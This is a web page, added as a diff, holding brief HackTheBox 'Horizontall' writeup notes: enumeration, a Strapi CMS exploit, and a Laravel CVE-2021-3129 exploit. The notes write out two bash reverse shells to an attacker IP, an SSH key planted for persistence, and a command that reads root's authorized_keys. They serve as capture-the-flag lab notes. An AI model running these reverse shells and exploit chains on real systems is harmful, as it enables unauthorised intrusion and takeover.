@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="UTF-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE-edge" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+	<title>test</title>
+	<link rel="stylesheet" href="../../../css/style.css" />
+	<style>
+		h1 {
+			color: #00ff00;
+			/* change the color of the main heading */
+		}
+
+		h3 {
+			color: #ff00ff;
+			/* change the color of the subheadings */
+		}
+
+		a {
+			color: #ffffff;
+			/* change the color of the links */
+			text-decoration: none;
+			/* remove underlines from links */
+		}
+	</style>
+</head>
+<body>
+	<header class="writeups">
+		<h1 class="neon textHeading">Writeups - Notes - CTF's</h1>
+			<h3 class="links2-custom">
+				·
+				<a href="https://twitter.com/AnonHack3r" class="custom-link2">Twitter</a>
+				·
+				<a href="https://www.youtube.com/@AnonHack3r_1337" class="custom-link2">YouTube</a>
+				·
+				<a href="https://app.hackthebox.com/profile/480696" class="custom-link2">AnonHack3r</a>
+				·
+			</h3>
+	</header>
+	
+	<main class="topics-container">
+		<div >
+			<p>
+				<h1 class="custom-heading neon" data-value="HackTheBox Writeups">HackTheBox Writeups</h1>
+			</p>
+		</div>
+
+		<div class="writeupNotes">
+			<h1 id="nmap-scan">Nmap Scan</h1>
+			<p>22/tcp open  ssh
+80/tcp open  http</p>
+<p><a href="http://horizontall.htb">http://horizontall.htb</a></p>
+<p>tried directoy brute forcing didnt find anything lets move on to dns</p>
+<p>gobuster vhost -u horizontall.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+Found: api-prod.horizontall.htb (Status: 200) [Size: 413]</p>
+<p> curl -v <a href="http://horizontall.htb/js/app.c68eb462.js">http://horizontall.htb/js/app.c68eb462.js</a> 
+{getReviews:function(){var t=this;r.a.get(&quot;<a href="http://api-prod.horizontall.htb/reviews&quot;">http://api-prod.horizontall.htb/reviews&quot;</a>) we can see the other subdomain here. </p>
+<p>found version number 
+Strapi CMS 3.0.0-beta.17.4
+/admin/init</p>
+<p>run exploit Found using searchsploit 
+then past rev shell.
+/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.27/31337 0&gt;&amp;1&#39;</p>
+<p>netstat -ant found 8000, 1337, </p>
+<p>checkout 22-SSH
+cd ~/
+    mkdir .ssh
+        echo &quot;ssh-rsa AAAA...= bob@kali&quot; &gt; authorized_keys</p>
+<p>chmod 600 id_rsa
+ssh -i id_rsa -L 8000:127.0.0.1:8000 <a href="mailto:&#115;&#x74;&#x72;&#x61;&#x70;&#105;&#64;&#104;&#111;&#x72;&#x69;&#x7a;&#x6f;&#x6e;&#x74;&#97;&#x6c;&#108;&#x2e;&#x68;&#x74;&#x62;">&#115;&#x74;&#x72;&#x61;&#x70;&#105;&#64;&#104;&#111;&#x72;&#x69;&#x7a;&#x6f;&#x6e;&#x74;&#97;&#x6c;&#108;&#x2e;&#x68;&#x74;&#x62;</a> -N -v</p>
+<p>now we can access that page on our machine. </p>
+<p>CVE-2021-3129_exploit
+<a href="https://github.com/nth347/CVE-2021-3129_exploit">https://github.com/nth347/CVE-2021-3129_exploit</a></p>
+<p>./exploit.py <a href="http://localhost:8000">http://localhost:8000</a> Monolog/RCE1 &#39;which nc &amp;&amp; whoami &amp;&amp; id &amp;&amp; cat /root/.ssh/authorized_keys &amp;&amp; /bin/bash -c &quot;sh -i &gt;&amp; /dev/tcp/10.10.14.27/9080 0&gt;&amp;1&quot;&#39;</p>
+<p>start another nc listener on port 9080 boom.</p>
+
+		</div>
+		<div class="container">
+			<div class="terminal-box">
+				<div class="terminal-body">
+					<div style="text-align: center;"></div>
+					<img src="../../../example.svg" class="example-svg">
+					<div class="space">
+						<p></p>
+					</div>
+					<div style="display: flex; flex-direction: column; align-items: center;">
+						<p class="command-text"><br>For a list of the commands, type<br>
+							<span class="help-txt">"help"</span>
+						</p>
+						<div
+							<div class="cursor">
+								<input id="text" class="txt-input" placeholder="Type something..." autocapitalize="off"
+									autocorrect="off" inputmode="text">
+								<p></p>
+								<i></i>
+							</div>
+						</div>
+					</div>
+					<div class="content"></div>
+				</div>
+			</div>
+		</div>
+		<div class="badge">
+			<!-- BADGES -->
+			<p>
+				<img src="https://img.shields.io/github/last-commit/AnonHack3r1337/CTF?color=red&style=flat-square">
+				<!-- BADGES -->
+			</p>
+		</div>
+		
+	</main>
+
+	<footer class="footerWithContact">
+		<div class="contactMe">
+			<!-- Footer content here -->
+			<p>Contact Me
+				
+			</p>
+		</div>
+		<div >
+			<p>
+			<a href="https://twitter.com/AnonHack3r" class="DM">
+			<span>
+				Direct Message on Twitter
+			</span>
+			</a>
+			</p>
+			<p></p>
+		</div>
+		<p></p>
+	</footer>
+
+	<script src="../../../js/main.js"></script>
+</body>
+
+</html>
